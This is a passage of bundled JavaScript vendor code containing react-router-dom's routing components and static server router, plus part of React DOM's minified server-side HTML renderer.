    window.history.scrollRestoration = "auto";
  }), []), usePageHide(React2.useCallback(() => {
    if (navigation.state === "idle") {
      let key = (getKey ? getKey(location, matches) : null) || location.key;
      savedScrollPositions[key] = window.scrollY;
    }
    sessionStorage.setItem(storageKey || SCROLL_RESTORATION_STORAGE_KEY, JSON.stringify(savedScrollPositions)), window.history.scrollRestoration = "auto";
  }, [storageKey, getKey, navigation.state, location, matches])), typeof document < "u" && (React2.useLayoutEffect(() => {
    try {
      let sessionPositions = sessionStorage.getItem(storageKey || SCROLL_RESTORATION_STORAGE_KEY);
      sessionPositions && (savedScrollPositions = JSON.parse(sessionPositions));
    } catch {
    }
  }, [storageKey]), React2.useLayoutEffect(() => {
    let getKeyWithoutBasename = getKey && basename !== "/" ? (location2, matches2) => getKey(
      // Strip the basename to match useLocation()
      _extends3({}, location2, {
        pathname: stripBasename(location2.pathname, basename) || location2.pathname
      }),
      matches2
    ) : getKey, disableScrollRestoration = router == null ? void 0 : router.enableScrollRestoration(savedScrollPositions, () => window.scrollY, getKeyWithoutBasename);
    return () => disableScrollRestoration && disableScrollRestoration();
  }, [router, basename, getKey]), React2.useLayoutEffect(() => {
    if (restoreScrollPosition !== !1) {
      if (typeof restoreScrollPosition == "number") {
        window.scrollTo(0, restoreScrollPosition);
        return;
      }
      if (location.hash) {
        let el = document.getElementById(decodeURIComponent(location.hash.slice(1)));
        if (el) {
          el.scrollIntoView();
          return;
        }
      }
      preventScrollReset !== !0 && window.scrollTo(0, 0);
    }
  }, [location, restoreScrollPosition, preventScrollReset]));
}
function useBeforeUnload(callback, options) {
  let {
    capture
  } = options || {};
  React2.useEffect(() => {
    let opts = capture != null ? {
      capture
    } : void 0;
    return window.addEventListener("beforeunload", callback, opts), () => {
      window.removeEventListener("beforeunload", callback, opts);
    };
  }, [callback, capture]);
}
function usePageHide(callback, options) {
  let {
    capture
  } = options || {};
  React2.useEffect(() => {
    let opts = capture != null ? {
      capture
    } : void 0;
    return window.addEventListener("pagehide", callback, opts), () => {
      window.removeEventListener("pagehide", callback, opts);
    };
  }, [callback, capture]);
}
function usePrompt(_ref8) {
  let {
    when,
    message
  } = _ref8, blocker = useBlocker(when);
  React2.useEffect(() => {
    blocker.state === "blocked" && !when && blocker.reset();
  }, [blocker, when]), React2.useEffect(() => {
    blocker.state === "blocked" && (window.confirm(message) ? setTimeout(blocker.proceed, 0) : blocker.reset());
  }, [blocker, message]);
}
var React2, defaultMethod, defaultEncType, _formDataSupportsSubmitter, supportedFormEncTypes, _excluded, _excluded2, _excluded3, START_TRANSITION2, startTransitionImpl2, isBrowser, ABSOLUTE_URL_REGEX2, Link, NavLink, Form, FormImpl, DataRouterHook2, DataRouterStateHook2, fetcherId, SCROLL_RESTORATION_STORAGE_KEY, savedScrollPositions, init_dist2 = __esm({
  "node_modules/react-router-dom/dist/index.js"() {
    React2 = __toESM(require_react());
    init_dist();
    init_dist();
    init_router();
    defaultMethod = "get", defaultEncType = "application/x-www-form-urlencoded";
    _formDataSupportsSubmitter = null;
    supportedFormEncTypes = /* @__PURE__ */ new Set(["application/x-www-form-urlencoded", "multipart/form-data", "text/plain"]);
    _excluded = ["onClick", "relative", "reloadDocument", "replace", "state", "target", "to", "preventScrollReset"], _excluded2 = ["aria-current", "caseSensitive", "className", "end", "style", "to", "children"], _excluded3 = ["reloadDocument", "replace", "state", "method", "action", "onSubmit", "submit", "relative", "preventScrollReset"];
    START_TRANSITION2 = "startTransition", startTransitionImpl2 = React2[START_TRANSITION2];
    isBrowser = typeof window < "u" && typeof window.document < "u" && typeof window.document.createElement < "u", ABSOLUTE_URL_REGEX2 = /^(?:[a-z][a-z0-9+.-]*:|\/\/)/i, Link = /* @__PURE__ */ React2.forwardRef(function(_ref4, ref) {
      let {
        onClick,
        relative,
        reloadDocument,
        replace,
        state,
        target,
        to,
        preventScrollReset
      } = _ref4, rest = _objectWithoutPropertiesLoose(_ref4, _excluded), {
        basename
      } = React2.useContext(NavigationContext), absoluteHref, isExternal = !1;
      if (typeof to == "string" && ABSOLUTE_URL_REGEX2.test(to) && (absoluteHref = to, isBrowser))
        try {
          let currentUrl = new URL(window.location.href), targetUrl = to.startsWith("//") ? new URL(currentUrl.protocol + to) : new URL(to), path2 = stripBasename(targetUrl.pathname, basename);
          targetUrl.origin === currentUrl.origin && path2 != null ? to = path2 + targetUrl.search + targetUrl.hash : isExternal = !0;
        } catch {
        }
      let href = useHref(to, {
        relative
      }), internalOnClick = useLinkClickHandler(to, {
        replace,
        state,
        target,
        preventScrollReset,
        relative
      });
      function handleClick(event2) {
        onClick && onClick(event2), event2.defaultPrevented || internalOnClick(event2);
      }
      return (
        // eslint-disable-next-line jsx-a11y/anchor-has-content
        /* @__PURE__ */ React2.createElement("a", _extends3({}, rest, {
          href: absoluteHref || href,
          onClick: isExternal || reloadDocument ? onClick : handleClick,
          ref,
          target
        }))
      );
    }), NavLink = /* @__PURE__ */ React2.forwardRef(function(_ref5, ref) {
      let {
        "aria-current": ariaCurrentProp = "page",
        caseSensitive = !1,
        className: classNameProp = "",
        end = !1,
        style: styleProp,
        to,
        children
      } = _ref5, rest = _objectWithoutPropertiesLoose(_ref5, _excluded2), path2 = useResolvedPath(to, {
        relative: rest.relative
      }), location = useLocation(), routerState = React2.useContext(DataRouterStateContext), {
        navigator
      } = React2.useContext(NavigationContext), toPathname = navigator.encodeLocation ? navigator.encodeLocation(path2).pathname : path2.pathname, locationPathname = location.pathname, nextLocationPathname = routerState && routerState.navigation && routerState.navigation.location ? routerState.navigation.location.pathname : null;
      caseSensitive || (locationPathname = locationPathname.toLowerCase(), nextLocationPathname = nextLocationPathname ? nextLocationPathname.toLowerCase() : null, toPathname = toPathname.toLowerCase());
      let isActive = locationPathname === toPathname || !end && locationPathname.startsWith(toPathname) && locationPathname.charAt(toPathname.length) === "/", isPending = nextLocationPathname != null && (nextLocationPathname === toPathname || !end && nextLocationPathname.startsWith(toPathname) && nextLocationPathname.charAt(toPathname.length) === "/"), ariaCurrent = isActive ? ariaCurrentProp : void 0, className;
      typeof classNameProp == "function" ? className = classNameProp({
        isActive,
        isPending
      }) : className = [classNameProp, isActive ? "active" : null, isPending ? "pending" : null].filter(Boolean).join(" ");
      let style = typeof styleProp == "function" ? styleProp({
        isActive,
        isPending
      }) : styleProp;
      return /* @__PURE__ */ React2.createElement(Link, _extends3({}, rest, {
        "aria-current": ariaCurrent,
        className,
        ref,
        style,
        to
      }), typeof children == "function" ? children({
        isActive,
        isPending
      }) : children);
    }), Form = /* @__PURE__ */ React2.forwardRef((props, ref) => {
      let submit = useSubmit();
      return /* @__PURE__ */ React2.createElement(FormImpl, _extends3({}, props, {
        submit,
        ref
      }));
    }), FormImpl = /* @__PURE__ */ React2.forwardRef((_ref6, forwardedRef) => {
      let {
        reloadDocument,
        replace,
        state,
        method = defaultMethod,
        action: action2,
        onSubmit,
        submit,
        relative,
        preventScrollReset
      } = _ref6, props = _objectWithoutPropertiesLoose(_ref6, _excluded3), formMethod = method.toLowerCase() === "get" ? "get" : "post", formAction = useFormAction(action2, {
        relative
      });
      return /* @__PURE__ */ React2.createElement("form", _extends3({
        ref: forwardedRef,
        method: formMethod,
        action: formAction,
        onSubmit: reloadDocument ? onSubmit : (event2) => {
          if (onSubmit && onSubmit(event2), event2.defaultPrevented)
            return;
          event2.preventDefault();
          let submitter = event2.nativeEvent.submitter, submitMethod = (submitter == null ? void 0 : submitter.getAttribute("formmethod")) || method;
          submit(submitter || event2.currentTarget, {
            method: submitMethod,
            replace,
            state,
            relative,
            preventScrollReset
          });
        }
      }, props));
    });
    (function(DataRouterHook3) {
      DataRouterHook3.UseScrollRestoration = "useScrollRestoration", DataRouterHook3.UseSubmit = "useSubmit", DataRouterHook3.UseSubmitFetcher = "useSubmitFetcher", DataRouterHook3.UseFetcher = "useFetcher";
    })(DataRouterHook2 || (DataRouterHook2 = {}));
    (function(DataRouterStateHook3) {
      DataRouterStateHook3.UseFetchers = "useFetchers", DataRouterStateHook3.UseScrollRestoration = "useScrollRestoration";
    })(DataRouterStateHook2 || (DataRouterStateHook2 = {}));
    fetcherId = 0;
    SCROLL_RESTORATION_STORAGE_KEY = "react-router-scroll-positions", savedScrollPositions = {};
  }
});

// node_modules/react-router-dom/server.js
var require_server = __commonJS({
  "node_modules/react-router-dom/server.js"(exports) {
    "use strict";
    Object.defineProperty(exports, "__esModule", { value: !0 });
    var React8 = require_react(), router = (init_router(), __toCommonJS(router_exports)), reactRouter = (init_dist(), __toCommonJS(dist_exports)), reactRouterDom = (init_dist2(), __toCommonJS(dist_exports2));
    function _interopNamespace(e) {
      if (e && e.__esModule)
        return e;
      var n = /* @__PURE__ */ Object.create(null);
      return e && Object.keys(e).forEach(function(k) {
        if (k !== "default") {
          var d = Object.getOwnPropertyDescriptor(e, k);
          Object.defineProperty(n, k, d.get ? d : {
            enumerable: !0,
            get: function() {
              return e[k];
            }
          });
        }
      }), n.default = e, Object.freeze(n);
    }
    var React__namespace = /* @__PURE__ */ _interopNamespace(React8);
    function StaticRouter({
      basename,
      children,
      location: locationProp = "/"
    }) {
      typeof locationProp == "string" && (locationProp = reactRouterDom.parsePath(locationProp));
      let action2 = router.Action.Pop, location = {
        pathname: locationProp.pathname || "/",
        search: locationProp.search || "",
        hash: locationProp.hash || "",
        state: locationProp.state || null,
        key: locationProp.key || "default"
      }, staticNavigator = getStatelessNavigator();
      return /* @__PURE__ */ React__namespace.createElement(reactRouterDom.Router, {
        basename,
        children,
        location,
        navigationType: action2,
        navigator: staticNavigator,
        static: !0
      });
    }
    function StaticRouterProvider2({
      context,
      router: router$1,
      hydrate = !0,
      nonce
    }) {
      router$1 && context || router.UNSAFE_invariant(!1);
      let dataRouterContext = {
        router: router$1,
        navigator: getStatelessNavigator(),
        static: !0,
        staticContext: context,
        basename: context.basename || "/"
      }, hydrateScript = "";
      if (hydrate !== !1) {
        let data = {
          loaderData: context.loaderData,
          actionData: context.actionData,
          errors: serializeErrors2(context.errors)
        };
        hydrateScript = `window.__staticRouterHydrationData = JSON.parse(${htmlEscape(JSON.stringify(JSON.stringify(data)))});`;
      }
      let {
        state
      } = dataRouterContext.router;
      return /* @__PURE__ */ React__namespace.createElement(React__namespace.Fragment, null, /* @__PURE__ */ React__namespace.createElement(reactRouterDom.UNSAFE_DataRouterContext.Provider, {
        value: dataRouterContext
      }, /* @__PURE__ */ React__namespace.createElement(reactRouterDom.UNSAFE_DataRouterStateContext.Provider, {
        value: state
      }, /* @__PURE__ */ React__namespace.createElement(reactRouterDom.Router, {
        basename: dataRouterContext.basename,
        location: state.location,
        navigationType: state.historyAction,
        navigator: dataRouterContext.navigator,
        static: dataRouterContext.static
      }, /* @__PURE__ */ React__namespace.createElement(DataRoutes2, {
        routes: router$1.routes,
        state
      })))), hydrateScript ? /* @__PURE__ */ React__namespace.createElement("script", {
        suppressHydrationWarning: !0,
        nonce,
        dangerouslySetInnerHTML: {
          __html: hydrateScript
        }
      }) : null);
    }
    function DataRoutes2({
      routes: routes2,
      state
    }) {
      return reactRouter.UNSAFE_useRoutesImpl(routes2, void 0, state);
    }
    function serializeErrors2(errors) {
      if (!errors)
        return null;
      let entries = Object.entries(errors), serialized = {};
      for (let [key, val] of entries)
        router.isRouteErrorResponse(val) ? serialized[key] = {
          ...val,
          __type: "RouteErrorResponse"
        } : val instanceof Error ? serialized[key] = {
          message: val.message,
          __type: "Error",
          // If this is a subclass (i.e., ReferenceError), send up the type so we
          // can re-create the same type during hydration.
          ...val.name !== "Error" ? {
            __subType: val.name
          } : {}
        } : serialized[key] = val;
      return serialized;
    }
    function getStatelessNavigator() {
      return {
        createHref,
        encodeLocation,
        push(to) {
          throw new Error(`You cannot use navigator.push() on the server because it is a stateless environment. This error was probably triggered when you did a \`navigate(${JSON.stringify(to)})\` somewhere in your app.`);
        },
        replace(to) {
          throw new Error(`You cannot use navigator.replace() on the server because it is a stateless environment. This error was probably triggered when you did a \`navigate(${JSON.stringify(to)}, { replace: true })\` somewhere in your app.`);
        },
        go(delta) {
          throw new Error(`You cannot use navigator.go() on the server because it is a stateless environment. This error was probably triggered when you did a \`navigate(${delta})\` somewhere in your app.`);
        },
        back() {
          throw new Error("You cannot use navigator.back() on the server because it is a stateless environment.");
        },
        forward() {
          throw new Error("You cannot use navigator.forward() on the server because it is a stateless environment.");
        }
      };
    }
    function createStaticHandler2(routes2, opts) {
      return router.createStaticHandler(routes2, {
        ...opts,
        mapRouteProperties: reactRouter.UNSAFE_mapRouteProperties
      });
    }
    function createStaticRouter2(routes2, context) {
      let manifest = {}, dataRoutes = router.UNSAFE_convertRoutesToDataRoutes(routes2, reactRouter.UNSAFE_mapRouteProperties, void 0, manifest), matches = context.matches.map((match) => {
        let route = manifest[match.route.id] || match.route;
        return {
          ...match,
          route
        };
      }), msg = (method) => `You cannot use router.${method}() on the server because it is a stateless environment`;
      return {
        get basename() {
          return context.basename;
        },
        get state() {
          return {
            historyAction: router.Action.Pop,
            location: context.location,
            matches,
            loaderData: context.loaderData,
            actionData: context.actionData,
            errors: context.errors,
            initialized: !0,
            navigation: router.IDLE_NAVIGATION,
            restoreScrollPosition: null,
            preventScrollReset: !1,
            revalidation: "idle",
            fetchers: /* @__PURE__ */ new Map(),
            blockers: /* @__PURE__ */ new Map()
          };
        },
        get routes() {
          return dataRoutes;
        },
        initialize() {
          throw msg("initialize");
        },
        subscribe() {
          throw msg("subscribe");
        },
        enableScrollRestoration() {
          throw msg("enableScrollRestoration");
        },
        navigate() {
          throw msg("navigate");
        },
        fetch() {
          throw msg("fetch");
        },
        revalidate() {
          throw msg("revalidate");
        },
        createHref,
        encodeLocation,
        getFetcher() {
          return router.IDLE_FETCHER;
        },
        deleteFetcher() {
          throw msg("deleteFetcher");
        },
        dispose() {
          throw msg("dispose");
        },
        getBlocker() {
          return router.IDLE_BLOCKER;
        },
        deleteBlocker() {
          throw msg("deleteBlocker");
        },
        _internalFetchControllers: /* @__PURE__ */ new Map(),
        _internalActiveDeferreds: /* @__PURE__ */ new Map(),
        _internalSetRoutes() {
          throw msg("_internalSetRoutes");
        }
      };
    }
    function createHref(to) {
      return typeof to == "string" ? to : reactRouterDom.createPath(to);
    }
    function encodeLocation(to) {
      let path2 = typeof to == "string" ? reactRouterDom.parsePath(to) : to;
      return {
        pathname: path2.pathname || "",
        search: path2.search || "",
        hash: path2.hash || ""
      };
    }
    var ESCAPE_LOOKUP3 = {
      "&": "\\u0026",
      ">": "\\u003e",
      "<": "\\u003c",
      "\u2028": "\\u2028",
      "\u2029": "\\u2029"
    }, ESCAPE_REGEX3 = /[&><\u2028\u2029]/g;
    function htmlEscape(str) {
      return str.replace(ESCAPE_REGEX3, (match) => ESCAPE_LOOKUP3[match]);
    }
    exports.StaticRouter = StaticRouter;
    exports.StaticRouterProvider = StaticRouterProvider2;
    exports.createStaticHandler = createStaticHandler2;
    exports.createStaticRouter = createStaticRouter2;
  }
});

// node_modules/react-dom/cjs/react-dom-server-legacy.browser.production.min.js
var require_react_dom_server_legacy_browser_production_min = __commonJS({
  "node_modules/react-dom/cjs/react-dom-server-legacy.browser.production.min.js"(exports) {
    "use strict";
    var aa = require_react();
    function l(a) {
      for (var b = "https://reactjs.org/docs/error-decoder.html?invariant=" + a, c = 1; c < arguments.length; c++)
        b += "&args[]=" + encodeURIComponent(arguments[c]);
      return "Minified React error #" + a + "; visit " + b + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings.";
    }
    var p = Object.prototype.hasOwnProperty, fa = /^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/, ha = {}, ia = {};
    function ja(a) {
      return p.call(ia, a) ? !0 : p.call(ha, a) ? !1 : fa.test(a) ? ia[a] = !0 : (ha[a] = !0, !1);
    }
    function r(a, b, c, d, f, e, g) {
      this.acceptsBooleans = b === 2 || b === 3 || b === 4, this.attributeName = d, this.attributeNamespace = f, this.mustUseProperty = c, this.propertyName = a, this.type = b, this.sanitizeURL = e, this.removeEmptyString = g;
    }
    var t = {};
    "children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(a) {
      t[a] = new r(a, 0, !1, a, null, !1, !1);
    });
    [["acceptCharset", "accept-charset"], ["className", "class"], ["htmlFor", "for"], ["httpEquiv", "http-equiv"]].forEach(function(a) {
      var b = a[0];
      t[b] = new r(b, 1, !1, a[1], null, !1, !1);
    });
    ["contentEditable", "draggable", "spellCheck", "value"].forEach(function(a) {
      t[a] = new r(a, 2, !1, a.toLowerCase(), null, !1, !1);
    });
    ["autoReverse", "externalResourcesRequired", "focusable", "preserveAlpha"].forEach(function(a) {
      t[a] = new r(a, 2, !1, a, null, !1, !1);
    });
    "allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(a) {
      t[a] = new r(a, 3, !1, a.toLowerCase(), null, !1, !1);
    });
    ["checked", "multiple", "muted", "selected"].forEach(function(a) {
      t[a] = new r(a, 3, !0, a, null, !1, !1);
    });
    ["capture", "download"].forEach(function(a) {
      t[a] = new r(a, 4, !1, a, null, !1, !1);
    });
    ["cols", "rows", "size", "span"].forEach(function(a) {
      t[a] = new r(a, 6, !1, a, null, !1, !1);
    });
    ["rowSpan", "start"].forEach(function(a) {
      t[a] = new r(a, 5, !1, a.toLowerCase(), null, !1, !1);
    });
    var ka = /[\-:]([a-z])/g;
    function la(a) {
      return a[1].toUpperCase();
    }
    "accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(a) {
      var b = a.replace(
        ka,
        la
      );
      t[b] = new r(b, 1, !1, a, null, !1, !1);
    });
    "xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(a) {
      var b = a.replace(ka, la);
      t[b] = new r(b, 1, !1, a, "http://www.w3.org/1999/xlink", !1, !1);
    });
    ["xml:base", "xml:lang", "xml:space"].forEach(function(a) {
      var b = a.replace(ka, la);
      t[b] = new r(b, 1, !1, a, "http://www.w3.org/XML/1998/namespace", !1, !1);
    });
    ["tabIndex", "crossOrigin"].forEach(function(a) {
      t[a] = new r(a, 1, !1, a.toLowerCase(), null, !1, !1);
    });
    t.xlinkHref = new r("xlinkHref", 1, !1, "xlink:href", "http://www.w3.org/1999/xlink", !0, !1);
    ["src", "href", "action", "formAction"].forEach(function(a) {
      t[a] = new r(a, 1, !1, a.toLowerCase(), null, !0, !0);
    });
    var u = {
      animationIterationCount: !0,
      aspectRatio: !0,
      borderImageOutset: !0,
      borderImageSlice: !0,
      borderImageWidth: !0,
      boxFlex: !0,
      boxFlexGroup: !0,
      boxOrdinalGroup: !0,
      columnCount: !0,
      columns: !0,
      flex: !0,
      flexGrow: !0,
      flexPositive: !0,
      flexShrink: !0,
      flexNegative: !0,
      flexOrder: !0,
      gridArea: !0,
      gridRow: !0,
      gridRowEnd: !0,
      gridRowSpan: !0,
      gridRowStart: !0,
      gridColumn: !0,
      gridColumnEnd: !0,
      gridColumnSpan: !0,
      gridColumnStart: !0,
      fontWeight: !0,
      lineClamp: !0,
      lineHeight: !0,
      opacity: !0,
      order: !0,
      orphans: !0,
      tabSize: !0,
      widows: !0,
      zIndex: !0,
      zoom: !0,
      fillOpacity: !0,
      floodOpacity: !0,
      stopOpacity: !0,
      strokeDasharray: !0,
      strokeDashoffset: !0,
      strokeMiterlimit: !0,
      strokeOpacity: !0,
      strokeWidth: !0
    }, ma = ["Webkit", "ms", "Moz", "O"];
    Object.keys(u).forEach(function(a) {
      ma.forEach(function(b) {
        b = b + a.charAt(0).toUpperCase() + a.substring(1), u[b] = u[a];
      });
    });
    var na = /["'&<>]/;
    function v(a) {
      if (typeof a == "boolean" || typeof a == "number")
        return "" + a;
      a = "" + a;
      var b = na.exec(a);
      if (b) {
        var c = "", d, f = 0;
        for (d = b.index; d < a.length; d++) {
          switch (a.charCodeAt(d)) {
            case 34:
              b = "&quot;";
              break;
            case 38:
              b = "&amp;";
              break;
            case 39:
              b = "&#x27;";
              break;
            case 60:
              b = "&lt;";
              break;
            case 62:
              b = "&gt;";
              break;
            default:
              continue;
          }
          f !== d && (c += a.substring(f, d)), f = d + 1, c += b;
        }
        a = f !== d ? c + a.substring(f, d) : c;
      }
      return a;
    }
    var oa = /([A-Z])/g, pa = /^ms-/, qa = Array.isArray;
    function w(a, b) {
      return { insertionMode: a, selectedValue: b };
    }
    function ra(a, b, c) {
      switch (b) {
        case "select":
          return w(1, c.value != null ? c.value : c.defaultValue);
        case "svg":
          return w(2, null);
        case "math":
          return w(3, null);
        case "foreignObject":
          return w(1, null);
        case "table":
          return w(4, null);
        case "thead":
        case "tbody":
        case "tfoot":
          return w(5, null);
        case "colgroup":
          return w(7, null);
        case "tr":
          return w(6, null);
      }
      return 4 <= a.insertionMode || a.insertionMode === 0 ? w(1, null) : a;
    }
    var sa = /* @__PURE__ */ new Map();
    function ta(a, b, c) {
      if (typeof c != "object")
        throw Error(l(62));
      b = !0;
      for (var d in c)
        if (p.call(c, d)) {
          var f = c[d];
          if (f != null && typeof f != "boolean" && f !== "") {
            if (d.indexOf("--") === 0) {
              var e = v(d);
              f = v(("" + f).trim());
            } else {
              e = d;
              var g = sa.get(e);
              g !== void 0 || (g = v(e.replace(oa, "-$1").toLowerCase().replace(pa, "-ms-")), sa.set(e, g)), e = g, f = typeof f == "number" ? f === 0 || p.call(u, d) ? "" + f : f + "px" : v(("" + f).trim());
            }
            b ? (b = !1, a.push(' style="', e, ":", f)) : a.push(";", e, ":", f);
          }
        }
      b || a.push('"');
    }
    function x(a, b, c, d) {
      switch (c) {
        case "style":
          ta(a, b, d);
          return;
        case "defaultValue":
        case "defaultChecked":
        case "innerHTML":
        case "suppressContentEditableWarning":
        case "suppressHydrationWarning":
          return;
      }
      if (!(2 < c.length) || c[0] !== "o" && c[0] !== "O" || c[1] !== "n" && c[1] !== "N") {
        if (b = t.hasOwnProperty(c) ? t[c] : null, b !== null) {
          switch (typeof d) {
            case "function":
            case "symbol":
              return;
            case "boolean":
              if (!b.acceptsBooleans)
                return;
          }
          switch (c = b.attributeName, b.type) {
            case 3:
              d && a.push(" ", c, '=""');
              break;
            case 4:
              d === !0 ? a.push(" ", c, '=""') : d !== !1 && a.push(" ", c, '="', v(d), '"');
              break;
            case 5:
              isNaN(d) || a.push(" ", c, '="', v(d), '"');
              break;
            case 6:
              !isNaN(d) && 1 <= d && a.push(" ", c, '="', v(d), '"');
              break;
            default:
              b.sanitizeURL && (d = "" + d), a.push(" ", c, '="', v(d), '"');
          }
        } else if (ja(c)) {
          switch (typeof d) {
            case "function":
            case "symbol":
              return;
            case "boolean":
              if (b = c.toLowerCase().slice(0, 5), b !== "data-" && b !== "aria-")
                return;
          }
          a.push(" ", c, '="', v(d), '"');
        }
      }
    }
    function y(a, b, c) {
      if (b != null) {
        if (c != null)
          throw Error(l(60));
        if (typeof b != "object" || !("__html" in b))
          throw Error(l(61));
        b = b.__html, b != null && a.push("" + b);
      }
    }
    function ua(a) {
      var b = "";
      return aa.Children.forEach(a, function(a2) {
        a2 != null && (b += a2);
      }), b;
    }
    function va(a, b, c, d) {
      a.push(A(c));
      var f = c = null, e;
      for (e in b)
        if (p.call(b, e)) {
          var g = b[e];
          if (g != null)
            switch (e) {
              case "children":
                c = g;
                break;
              case "dangerouslySetInnerHTML":
                f = g;
                break;
              default:
                x(a, d, e, g);
            }
        }
      return a.push(">"), y(a, f, c), typeof c == "string" ? (a.push(v(c)), null) : c;
    }
    var wa = /^[a-zA-Z][a-zA-Z:_\.\-\d]*$/, xa = /* @__PURE__ */ new Map();
    function A(a) {
      var b = xa.get(a);
      if (b === void 0) {
        if (!wa.test(a))
          throw Error(l(65, a));
        b = "<" + a, xa.set(a, b);
      }
      return b;
    }
    function ya(a, b, c, d, f) {
      switch (b) {
        case "select":
          a.push(A("select"));
          var e = null, g = null;
          for (n in c)
            if (p.call(c, n)) {
              var h = c[n];
              if (h != null)
                switch (n) {
                  case "children":
                    e = h;
                    break;
                  case "dangerouslySetInnerHTML":
                    g = h;
                    break;
                  case "defaultValue":
                  case "value":
                    break;
                  default:
                    x(a, d, n, h);
                }
            }
          return a.push(">"), y(a, g, e), e;
        case "option":
          g = f.selectedValue, a.push(A("option"));
          var k = h = null, m = null, n = null;
          for (e in c)
            if (p.call(c, e)) {
              var q = c[e];
              if (q != null)
                switch (e) {
                  case "children":
                    h = q;
                    break;
                  case "selected":
                    m = q;
                    break;
                  case "dangerouslySetInnerHTML":
                    n = q;
                    break;
                  case "value":
                    k = q;
                  default:
                    x(a, d, e, q);
                }
            }
          if (g != null)
            if (c = k !== null ? "" + k : ua(h), qa(g)) {
              for (d = 0; d < g.length; d++)
                if ("" + g[d] === c) {
                  a.push(' selected=""');
                  break;
                }
            } else
              "" + g === c && a.push(' selected=""');
          else
            m && a.push(' selected=""');
          return a.push(">"), y(a, n, h), h;
        case "textarea":
          a.push(A("textarea")), n = g = e = null;
          for (h in c)
            if (p.call(c, h) && (k = c[h], k != null))
              switch (h) {
                case "children":
                  n = k;
                  break;
                case "value":
                  e = k;
                  break;
                case "defaultValue":
                  g = k;
                  break;
                case "dangerouslySetInnerHTML":
                  throw Error(l(91));
                default:
                  x(
                    a,
                    d,
                    h,
                    k
                  );
              }
          if (e === null && g !== null && (e = g), a.push(">"), n != null) {
            if (e != null)
              throw Error(l(92));
            if (qa(n) && 1 < n.length)
              throw Error(l(93));
            e = "" + n;
          }
          return typeof e == "string" && e[0] === `
` && a.push(`
`), e !== null && a.push(v("" + e)), null;
        case "input":
          a.push(A("input")), k = n = h = e = null;
          for (g in c)
            if (p.call(c, g) && (m = c[g], m != null))
              switch (g) {
                case "children":
                case "dangerouslySetInnerHTML":
                  throw Error(l(399, "input"));
                case "defaultChecked":
                  k = m;
                  break;
                case "defaultValue":
                  h = m;
                  break;
                case "checked":
                  n = m;
                  break;
                case "value":
                  e = m;
                  break;
                default:
                  x(a, d, g, m);
              }
          return n !== null ? x(a, d, "checked", n) : k !== null && x(a, d, "checked", k), e !== null ? x(a, d, "value", e) : h !== null && x(a, d, "value", h), a.push("/>"), null;
        case "menuitem":
          a.push(A("menuitem"));
          for (var C in c)
            if (p.call(c, C) && (e = c[C], e != null))
              switch (C) {
                case "children":
                case "dangerouslySetInnerHTML":
                  throw Error(l(400));
                default:
                  x(a, d, C, e);
              }
          return a.push(">"), null;
        case "title":
          a.push(A("title")), e = null;
          for (q in c)
            if (p.call(c, q) && (g = c[q], g != null))
              switch (q) {
                case "children":
                  e = g;
                  break;
                case "dangerouslySetInnerHTML":
                  throw Error(l(434));
                default:
                  x(a, d, q, g);
              }
          return a.push(">"), e;
        case "listing":
        case "pre":
          a.push(A(b)), g = e = null;
          for (k in c)
            if (p.call(c, k) && (h = c[k], h != null))
              switch (k) {
                case "children":
                  e = h;
                  break;
                case "dangerouslySetInnerHTML":
                  g = h;
                  break;
                default:
                  x(a, d, k, h);
              }
          if (a.push(">"), g != null) {
            if (e != null)
              throw Error(l(60));
            if (typeof g != "object" || !("__html" in g))
              throw Error(l(61));
            c = g.__html, c != null && (typeof c == "string" && 0 < c.length && c[0] === `
` ? a.push(`
`, c) : a.push("" + c));
          }
          return typeof e == "string" && e[0] === `
` && a.push(`
`), e;
        case "area":
        case "base":
        case "br":
        case "col":
        case "embed":
        case "hr":
        case "img":
        case "keygen":
        case "link":
        case "meta":
        case "param":
        case "source":
        case "track":
        case "wbr":
          a.push(A(b));
          for (var D in c)
            if (p.call(c, D) && (e = c[D], e != null))
              switch (D) {
                case "children":
                case "dangerouslySetInnerHTML":
                  throw Error(l(399, b));
                default:
                  x(a, d, D, e);
              }
          return a.push("/>"), null;
        case "annotation-xml":
        case "color-profile":
        case "font-face":
        case "font-face-src":
        case "font-face-uri":
        case "font-face-format":
        case "font-face-name":
        case "missing-glyph":
          return va(
            a,
            c,
            b,
            d
          );
        case "html":
          return f.insertionMode === 0 && a.push("<!DOCTYPE html>"), va(a, c, b, d);
        default:
          if (b.indexOf("-") === -1 && typeof c.is != "string")
            return va(a, c, b, d);
          a.push(A(b)), g = e = null;
          for (m in c)
            if (p.call(c, m) && (h = c[m], h != null))
              switch (m) {
                case "children":
                  e = h;
                  break;
                case "dangerouslySetInnerHTML":
                  g = h;
                  break;
                case "style":
                  ta(a, d, h);
                  break;
